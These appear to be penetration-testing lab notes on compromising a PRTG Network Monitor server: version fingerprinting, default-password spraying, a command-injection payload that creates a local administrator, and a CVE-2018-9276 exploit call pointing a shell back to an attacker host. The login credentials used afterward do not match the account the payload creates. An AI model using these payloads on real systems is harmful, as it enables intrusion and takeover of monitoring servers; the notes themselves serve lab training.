### Footprinting + Enumeration
nmap output
```bash
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```

```shell
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```
### Exploitation
#### Password Spraying
`prtgadmin:prtgadmin` is often left unchanged
```bash
prtgadmin
Password123
admin
root
prtgadmin!
```

#### RCE via
This excellent [blog post](https://www.codewatch.org/blog/?p=453) by the individual who discovered this flaw does a great job of walking through the initial discovery process and how they discovered it

`Setup` -> `Account Settings` -> `Notifications` -> `Add new notification`

![](https://academy.hackthebox.com/storage/modules/113/prtg_add.png)

Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering `test.txt;net user adot Pwned123! /add;net localgroup administrators adot /add`. During an actual assessment, we may want to do something that does not change the system, such as getting a reverse shell or connection to our favorite C2. Finally, click the `Save` button.

![image](https://academy.hackthebox.com/storage/modules/113/prtg_execute.png)

After clicking `Save`, we will be redirected to the `Notifications` page and see our new notification named `pwn` in the list.

![](https://academy.hackthebox.com/storage/modules/113/prtg_pwn.png)

All that is left is to click the `Test` button to run our notification and execute the command to add a local admin user. After clicking `Test` we will get a pop-up that says `EXE notification is queued up`

```bash
netexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 
```
#### Known Vulnerabilities
##### [CVE-2018-9276](https://github.com/wildkindcc/CVE-2018-9276)
PRTG version `17.3.33.2830` is likely vulnerable to [CVE-2018-9276](https://github.com/wildkindcc/CVE-2018-9276) which is an authenticated command injection in the PRTG System Administrator web console

```bash
python3 CVE-2018-9276.py -i 172.16.1.15 -p 8080 --lhost 172.16.1.45 --lport 4443 --user prtgadmin --password prtgadmin 
```
